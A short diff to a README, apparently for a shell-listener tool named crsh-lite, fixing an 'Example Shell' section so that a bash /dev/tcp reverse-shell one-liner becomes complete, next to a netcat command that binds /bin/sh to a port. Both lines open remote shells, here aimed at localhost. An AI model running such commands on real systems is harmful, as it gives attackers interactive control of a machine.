@@ -32,6 +32,6 @@ $ ./crsh-lite 1337 localhost
 ## Example Shell
 
 ```bash
-bash -i >&/dev/tcp/localhost/9001
+bash -i >&/dev/tcp/localhost/9001 0>&1
 nc -lvp 1337 -e /bin/sh
 ```
